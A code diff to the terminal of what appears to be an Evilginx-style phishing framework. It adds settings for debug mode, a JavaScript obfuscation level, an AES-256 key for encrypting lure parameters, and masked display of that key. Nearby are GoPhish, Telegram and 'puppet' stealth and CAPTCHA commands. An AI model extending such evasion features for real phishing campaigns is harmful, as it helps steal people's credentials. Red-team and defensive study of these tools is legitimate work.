@@ -199,8 +199,8 @@ func (t *Terminal) handleConfig(args []string) error {
 		}
 
 
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram token", "telegram chat_id"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.telegramConfig.Token, t.cfg.telegramConfig.ChatId}
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "debug", "js_obfuscation", "enc_key", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram token", "telegram chat_id"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.sprintIsEnabled(t.cfg.GetDebugMode()), t.cfg.GetJsObfuscationLevel(), t.maskEncryptionKey(t.cfg.GetEncryptionKey()), t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.telegramConfig.Token, t.cfg.telegramConfig.ChatId}
 
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
@@ -234,6 +234,21 @@ func (t *Terminal) handleConfig(args []string) error {
 				t.manageCertificates(true)
 				return nil
 			}
+		case "debug":
+			switch args[1] {
+			case "on", "true":
+				t.cfg.SetDebugMode(true)
+				return nil
+			case "off", "false":
+				t.cfg.SetDebugMode(false)
+				return nil
+			}
+		case "js_obfuscation":
+			t.cfg.SetJsObfuscationLevel(args[1])
+			return nil
+		case "enc_key":
+			t.cfg.SetEncryptionKey(args[1])
+			return nil
 		case "gophish":
 			switch args[1] {
 			case "test":
@@ -1181,6 +1196,7 @@ func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
 		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
+			readline.PcItem("debug", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("js_obfuscation"), readline.PcItem("enc_key"),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
 	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
@@ -1189,6 +1205,9 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"ipv4", "bind"}, "ipv4 bind <ipv4_address>", "set ipv4 bind address of the current server")
 	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "change the url where all unauthorized requests will be redirected to")
 	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "enable or disable the automated certificate retrieval from letsencrypt")
+	h.AddSubCommand("config", []string{"debug"}, "debug <on|off>", "enable or disable debug mode for verbose logging")
+	h.AddSubCommand("config", []string{"js_obfuscation"}, "js_obfuscation <off|low|medium|high|ultra>", "set JavaScript obfuscation level (default: medium)")
+	h.AddSubCommand("config", []string{"enc_key"}, "enc_key <passphrase>", "set AES-256 encryption key for lure parameters (leave empty to use base64)")
 	h.AddSubCommand("config", []string{"gophish", "admin_url"}, "gophish admin_url <url>", "set up the admin url of a gophish instance to communicate with (e.g. https://gophish.domain.com:7777)")
 	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
 	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
@@ -1819,6 +1838,17 @@ func (t *Terminal) filterInput(r rune) (rune, bool) {
 	return r, true
 }
 
+// maskEncryptionKey masks the encryption key for display (shows only first 4 chars)
+func (t *Terminal) maskEncryptionKey(key string) string {
+	if key == "" {
+		return ""
+	}
+	if len(key) <= 4 {
+		return "****"
+	}
+	return key[:4] + "****"
+}
+
 // handlePuppet handles the puppet command
 func (t *Terminal) handlePuppet(args []string) error {
 	pn := len(args)
@@ -1834,8 +1864,7 @@ func (t *Terminal) handlePuppet(args []string) error {
   puppet sessions cleanup          - Cleanup old sessions
   puppet captcha set <service> <key> - Set CAPTCHA service and API key
   puppet stealth <on|off>          - Enable/disable stealth mode
-  puppet browser headless <on|off> - Set browser headless mode
-`)
+  puppet browser headless <on|off> - Set browser headless mode`)
 		return nil
 	}
 
